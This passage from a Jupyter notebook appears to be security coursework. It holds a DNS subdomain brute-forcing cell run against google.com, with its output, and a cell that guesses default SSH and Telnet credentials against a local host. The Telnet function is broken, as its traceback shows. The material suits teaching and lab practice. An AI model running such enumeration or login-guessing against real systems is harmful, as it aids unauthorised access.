            "Domain Names: ['ud-in-f104.1e100.net']\n",
            "172.217.193.105\n",
            "Domain Names: ['ud-in-f105.1e100.net']\n",
            "www9.google.com\n",
            "74.125.31.100\n",
            "Domain Names: ['va-in-f100.1e100.net']\n",
            "74.125.31.102\n",
            "Domain Names: ['va-in-f102.1e100.net']\n",
            "74.125.31.138\n",
            "Domain Names: ['va-in-f138.1e100.net']\n",
            "74.125.31.139\n",
            "Domain Names: ['va-in-f139.1e100.net']\n",
            "74.125.31.113\n",
            "Domain Names: ['va-in-f113.1e100.net']\n",
            "74.125.31.101\n",
            "Domain Names: ['va-in-f101.1e100.net']\n",
            "mail.google.com\n",
            "173.194.214.19\n",
            "Domain Names: ['vs-in-f19.1e100.net']\n",
            "173.194.214.83\n",
            "Domain Names: ['vs-in-f83.1e100.net']\n",
            "173.194.214.18\n",
            "Domain Names: ['vs-in-f18.1e100.net']\n",
            "173.194.214.17\n",
            "Domain Names: ['vs-in-f17.1e100.net']\n",
            "blog.google.com\n",
            "173.194.216.191\n",
            "Domain Names: ['vu-in-f191.1e100.net']\n",
            "ns.google.com\n",
            "216.239.32.10\n",
            "Domain Names: ['ns1.google.com']\n",
            "ns1.google.com\n",
            "216.239.32.10\n",
            "Domain Names: ['ns1.google.com']\n",
            "ns2.google.com\n",
            "216.239.34.10\n",
            "Domain Names: ['ns2.google.com']\n",
            "ns3.google.com\n",
            "216.239.36.10\n",
            "Domain Names: ['ns3.google.com']\n",
            "ns4.google.com\n",
            "216.239.38.10\n",
            "Domain Names: ['ns4.google.com']\n",
            "smtp.google.com\n",
            "172.217.193.26\n",
            "Domain Names: ['ud-in-f26.1e100.net']\n",
            "173.194.210.26\n",
            "Domain Names: ['vn-in-f26.1e100.net']\n",
            "172.217.203.26\n",
            "Domain Names: ['uf-in-f26.1e100.net']\n",
            "172.217.203.27\n",
            "Domain Names: ['uf-in-f27.1e100.net']\n",
            "142.250.98.27\n",
            "Domain Names: ['uh-in-f27.1e100.net']\n",
            "admin.google.com\n",
            "108.177.13.101\n",
            "Domain Names: ['ub-in-f101.1e100.net']\n",
            "108.177.13.113\n",
            "Domain Names: ['ub-in-f113.1e100.net']\n",
            "108.177.13.100\n",
            "Domain Names: ['ub-in-f100.1e100.net']\n",
            "108.177.13.139\n",
            "Domain Names: ['ub-in-f139.1e100.net']\n",
            "108.177.13.138\n",
            "Domain Names: ['ub-in-f138.1e100.net']\n",
            "108.177.13.102\n",
            "Domain Names: ['ub-in-f102.1e100.net']\n",
            "vpn.google.com\n",
            "64.9.224.70\n",
            "Domain Names: ['vpn.google.com']\n",
            "64.9.224.69\n",
            "Domain Names: ['vpn.google.com']\n",
            "64.9.224.68\n",
            "Domain Names: ['vpn.google.com']\n",
            "dns.google.com\n",
            "8.8.4.4\n",
            "Domain Names: ['dns.google']\n",
            "8.8.8.8\n",
            "Domain Names: ['dns.google']\n"
          ]
        },
        {
          "ename": "NoAnswer",
          "evalue": "ignored",
          "output_type": "error",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mNoAnswer\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-21-024efc07a20d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     39\u001b[0m \u001b[0;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0md\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\"r\"\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     40\u001b[0m     \u001b[0mdictionary\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msplitlines\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 41\u001b[0;31m \u001b[0mSubdomainSearch\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdomain\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mdictionary\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m<ipython-input-21-024efc07a20d>\u001b[0m in \u001b[0;36mSubdomainSearch\u001b[0;34m(domain, dictionary, nums)\u001b[0m\n\u001b[1;32m     28\u001b[0m     \u001b[0;32mfor\u001b[0m \u001b[0mword\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mdictionary\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     29\u001b[0m         \u001b[0msubdomain\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mword\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0;34m\".\"\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mdomain\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 30\u001b[0;31m         \u001b[0mDNSRequest\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0msubdomain\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     31\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mnums\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     32\u001b[0m             \u001b[0;32mfor\u001b[0m \u001b[0mi\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m10\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m<ipython-input-21-024efc07a20d>\u001b[0m in \u001b[0;36mDNSRequest\u001b[0;34m(domain)\u001b[0m\n\u001b[1;32m     14\u001b[0m     \u001b[0mips\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     15\u001b[0m     \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 16\u001b[0;31m         \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdns\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mresolver\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mresolve\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdomain\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     17\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     18\u001b[0m             \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdomain\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.8/dist-packages/dns/resolver.py\u001b[0m in \u001b[0;36mresolve\u001b[0;34m(qname, rdtype, rdclass, tcp, source, raise_on_no_answer, source_port, lifetime, search)\u001b[0m\n\u001b[1;32m   1366\u001b[0m     \"\"\"\n\u001b[1;32m   1367\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1368\u001b[0;31m     return get_default_resolver().resolve(\n\u001b[0m\u001b[1;32m   1369\u001b[0m         \u001b[0mqname\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1370\u001b[0m         \u001b[0mrdtype\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.8/dist-packages/dns/resolver.py\u001b[0m in \u001b[0;36mresolve\u001b[0;34m(self, qname, rdtype, rdclass, tcp, source, raise_on_no_answer, source_port, lifetime, search)\u001b[0m\n\u001b[1;32m   1229\u001b[0m                     \u001b[0;34m(\u001b[0m\u001b[0m_\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdone\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mresolution\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mquery_result\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mex\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1230\u001b[0m                     \u001b[0;32mcontinue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1231\u001b[0;31m                 \u001b[0;34m(\u001b[0m\u001b[0manswer\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdone\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mresolution\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mquery_result\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mresponse\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1232\u001b[0m                 \u001b[0;31m# Note we need to say \"if answer is not None\" and not just\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1233\u001b[0m                 \u001b[0;31m# \"if answer\" because answer implements __len__, and python\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.8/dist-packages/dns/resolver.py\u001b[0m in \u001b[0;36mquery_result\u001b[0;34m(self, response, ex)\u001b[0m\n\u001b[1;32m    766\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mresolver\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcache\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mput\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mqname\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrdtype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrdclass\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0manswer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    767\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0manswer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrrset\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_on_no_answer\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 768\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mNoAnswer\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mresponse\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0manswer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mresponse\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    769\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0manswer\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    770\u001b[0m         \u001b[0;32melif\u001b[0m \u001b[0mrcode\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0mdns\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrcode\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mNXDOMAIN\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mNoAnswer\u001b[0m: The DNS response does not contain an answer to the question: portal.google.com. IN A"
          ]
        }
      ],
      "source": [
        "#DNS Exploration - domain name system \n",
        "# изучение DNS-трафика\n",
        "import dns\n",
        "import dns.resolver\n",
        "import socket\n",
        "\n",
        "def ReverseDNS(ip):\n",
        "    try:\n",
        "        result = socket.gethostbyaddr(ip)\n",
        "        return [result[0]]+result[1]\n",
        "    except socket.herror:\n",
        "        return None\n",
        "\n",
        "def DNSRequest(domain):\n",
        "    ips = []\n",
        "    try:\n",
        "        result = dns.resolver.resolve(domain)\n",
        "        if result:\n",
        "            print(domain)\n",
        "            for answer in result:\n",
        "                print(answer)\n",
        "                print(\"Domain Names: %s\" % ReverseDNS(answer.to_text()))\n",
        "    except (dns.resolver.NXDOMAIN, dns.exception.Timeout):\n",
        "        return []\n",
        "    return ips\n",
        "\n",
        "def SubdomainSearch(domain, dictionary,nums):\n",
        "    successes = []\n",
        "    for word in dictionary:\n",
        "        subdomain = word+\".\"+domain\n",
        "        DNSRequest(subdomain)\n",
        "        if nums:\n",
        "            for i in range(0,10):\n",
        "                s = word+str(i)+\".\"+domain\n",
        "                DNSRequest(s)\n",
        "\n",
        "domain = \"google.com\"\n",
        "d = \"subdomains.txt\"\n",
        "dictionary = []\n",
        "with open(d,\"r\") as f:\n",
        "    dictionary = f.read().splitlines()\n",
        "SubdomainSearch(domain,dictionary,True)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8Z4GNla2ow6A"
      },
      "source": [
        "# Part_3"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 364
        },
        "id": "05uZb5rNpgL1",
        "outputId": "bd0bab72-6f54-4765-b659-cc819ffce39a"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Login failed admin pass\n"
          ]
        },
        {
          "ename": "gaierror",
          "evalue": "ignored",
          "output_type": "error",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mgaierror\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-28-d4b2111b04e7>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     40\u001b[0m         \u001b[0mpassword\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvals\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     41\u001b[0m         \u001b[0mSSHLogin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 42\u001b[0;31m         \u001b[0mTelnetLogin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m<ipython-input-28-d4b2111b04e7>\u001b[0m in \u001b[0;36mTelnetLogin\u001b[0;34m(host, port, username, password)\u001b[0m\n\u001b[1;32m     18\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mTelnetLogin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m     \u001b[0mh\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m\"http://\"\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0;34m\":\"\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mport1\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0;34m\"/\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m     \u001b[0mtn\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtelnetlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mTelnet\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mh\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m     \u001b[0mtn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread_until\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"login: \"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m     \u001b[0mtn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0musername\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m\"\\n\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.8/telnetlib.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, host, port, timeout)\u001b[0m\n\u001b[1;32m    216\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0moption_callback\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    217\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mhost\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 218\u001b[0;31m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    219\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    220\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_GLOBAL_DEFAULT_TIMEOUT\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.8/telnetlib.py\u001b[0m in \u001b[0;36mopen\u001b[0;34m(self, host, port, timeout)\u001b[0m\n\u001b[1;32m    233\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtimeout\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    234\u001b[0m         \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0maudit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"telnetlib.Telnet.open\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 235\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msock\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcreate_connection\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    236\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    237\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__del__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.8/socket.py\u001b[0m in \u001b[0;36mcreate_connection\u001b[0;34m(address, timeout, source_address)\u001b[0m\n\u001b[1;32m    785\u001b[0m     \u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0maddress\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    786\u001b[0m     \u001b[0merr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 787\u001b[0;31m     \u001b[0;32mfor\u001b[0m \u001b[0mres\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mgetaddrinfo\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mSOCK_STREAM\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    788\u001b[0m         \u001b[0maf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msocktype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mproto\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcanonname\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msa\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mres\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    789\u001b[0m         \u001b[0msock\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.8/socket.py\u001b[0m in \u001b[0;36mgetaddrinfo\u001b[0;34m(host, port, family, type, proto, flags)\u001b[0m\n\u001b[1;32m    916\u001b[0m     \u001b[0;31m# and socket type values to enum constants.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    917\u001b[0m     \u001b[0maddrlist\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 918\u001b[0;31m     \u001b[0;32mfor\u001b[0m \u001b[0mres\u001b[0m \u001b[0;32min\u001b[0m \u001b[0m_socket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetaddrinfo\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhost\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfamily\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mproto\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mflags\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    919\u001b[0m         \u001b[0maf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msocktype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mproto\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcanonname\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msa\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mres\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    920\u001b[0m         addrlist.append((_intenum_converter(af, AddressFamily),\n",
            "\u001b[0;31mgaierror\u001b[0m: [Errno -2] Name or service not known"
          ]
        }
      ],
      "source": [
        "#Default Accounts\n",
        "#аутентификация в учетной записи по логину и паролю\n",
        "import paramiko\n",
        "import telnetlib\n",
        "    \n",
        "def SSHLogin(host,port,username,password):\n",
        "    try: \n",
        "        ssh = paramiko.SSHClient()\n",
        "        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
        "        ssh.connect(host,port=port,username=username,password=password);\n",
        "        ssh_session = ssh.get_transport().open_session()\n",
        "        if ssh_session.active:\n",
        "            print(\"Login successful on %s:%s with username %s and password %s\" % (host,port,username,password))\n",
        "    except:\n",
        "            print(\"Login failed %s %s\" % (username,password))\n",
        "    ssh.close()\n",
        "    \n",
        "def TelnetLogin(host,port,username,password):\n",
        "    h = \"http://\"+host+\":\"+port1+\"/\"\n",
        "    tn = telnetlib.Telnet(h)\n",
        "    tn.read_until(\"login: \")\n",
        "    tn.write(username + \"\\n\")\n",
        "    tn.read_until(\"Password: \")\n",
        "    tn.write(password + \"\\n\")\n",
        "    try: \n",
        "        result = tn.expect([\"Last login\"])\n",
        "        if (result[0] > 0):\n",
        "            print(\"Telnet login successful on %s:%s with username %s and password %s\" % (host,port,username,password))\n",
        "        tn.close()\n",
        "    except EOFError:\n",
        "        print(\"Login failed %s %s\" % (username,password))\n",
        "\n",
        "host = \"127.0.0.1\"\n",
        "port = 2200\n",
        "port1 = str(port)\n",
        "with open(\"defaults.txt\",\"r\") as f:\n",
        "    for line in f:\n",
        "        vals = line.split()\n",
        "        username = vals[0].strip()\n",
        "        password = vals[1].strip()\n",
        "        SSHLogin(host,port,username,password)\n",
        "        TelnetLogin(host,port,username,password)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip uninstall pathlib"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m0TOyofaXUzY",
